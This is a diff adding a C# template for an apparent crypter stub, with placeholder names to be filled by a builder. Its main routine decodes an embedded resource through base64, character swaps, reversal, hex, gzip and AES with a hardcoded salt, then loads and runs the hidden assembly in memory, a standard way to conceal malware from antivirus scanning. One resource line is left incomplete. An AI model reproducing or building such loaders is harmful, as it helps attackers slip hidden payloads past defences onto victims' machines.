@@ -1,0 +1,135 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+using System.Reflection;
+using System.Text;
+using System.Security.Cryptography;
+using UpdateMe.Properties;
+
+namespace %RANDOMNAME%
+{
+    static class Program
+    {
+		private static string Key = "%KEYDECODE%";
+        static void Main()
+        {
+			//HERE is path of .res file:
+
+            string %hexa% = Resources.
+
+            string bb_ = Base64Decode(%hexa%);
+            string aa_ = bb_.Replace('?', '7');
+            string newValue_ = aa_.Replace('+', '0');
+            string test_ = new string(newValue_.Reverse<char>().ToArray<char>());
+
+            byte[] source_ = %BYTERANDOMNAME%(test_);
+            byte[] decompress = %Decompress%(source_);
+			byte[] BUGBNIEBFNOnnjkl = DecryptExe(decompress, Key);
+
+            Assembly.Load(BUGBNIEBFNOnnjkl).EntryPoint.Invoke(null, null);
+        }
+
+        private static byte[] %BYTERANDOMNAME%(string hex)
+        {
+            return Enumerable.Range(0, hex.Length)
+                             .Where(x => x % 2 == 0)
+                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
+                             .ToArray();
+        }
+
+
+        public static string Base64Decode(string base64EncodedData)
+        {
+            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
+            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
+        }
+
+
+		public static byte[] DecryptExe(byte[] encodedBytes, string PassKey)
+        {
+            byte[] result;
+            byte[] bytes = Encoding.UTF8.GetBytes(PassKey);
+            int iterations = 2444;
+
+            #region byteSalt
+            byte[] salt = new byte[]
+            {
+                    95,
+                    70,
+                    46,
+                    145,
+                    68,
+                    167,
+                    230,
+                    153,
+                    138,
+                    178,
+                    195,
+                    212,
+                    31,
+                    27,
+                    189,
+                    99,
+                    74,
+                    176,
+                    166,
+                    103,
+                    132,
+                    184,
+                    75,
+                    201,
+                    107,
+                    224,
+                    15,
+                    248,
+                    228,
+                    215
+            };
+            #endregion
+
+            MemoryStream memoryStream = new MemoryStream();
+            AesManaged aesManaged = new AesManaged();
+            aesManaged.KeySize = 256;
+            aesManaged.BlockSize = 128;
+            Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, iterations);
+            aesManaged.Key = rfc2898DeriveBytes.GetBytes((int)Math.Round(Math.Round((double)aesManaged.KeySize / 8.0)));
+            aesManaged.IV = rfc2898DeriveBytes.GetBytes((int)Math.Round(Math.Round((double)aesManaged.BlockSize / 8.0)));
+            aesManaged.Mode = CipherMode.CBC;
+
+            CryptoStream cs = new CryptoStream(memoryStream, aesManaged.CreateDecryptor(), CryptoStreamMode.Write);
+
+            cs.Write(encodedBytes, 0, encodedBytes.Length);
+            cs.Close();
+
+            result = memoryStream.ToArray();
+
+            return result;
+        }
+
+        private static byte[] %Decompress%(byte[] data)
+        {
+            using (MemoryStream memory = new MemoryStream(data))
+            using (GZipStream zip = new GZipStream(memory, CompressionMode.Decompress))
+            {
+                const int size = 4096;
+                byte[] buffer = new byte[size];
+                using (MemoryStream output = new MemoryStream())
+                {
+                    int count = 0;
+                    do
+                    {
+                        count = zip.Read(buffer, 0, size);
+                        if (count > 0)
+                        {
+                            output.Write(buffer, 0, count);
+                        }
+                    }
+                    while (count > 0);
+                    return output.ToArray();
+                }
+            }
+        }
+    }
+}
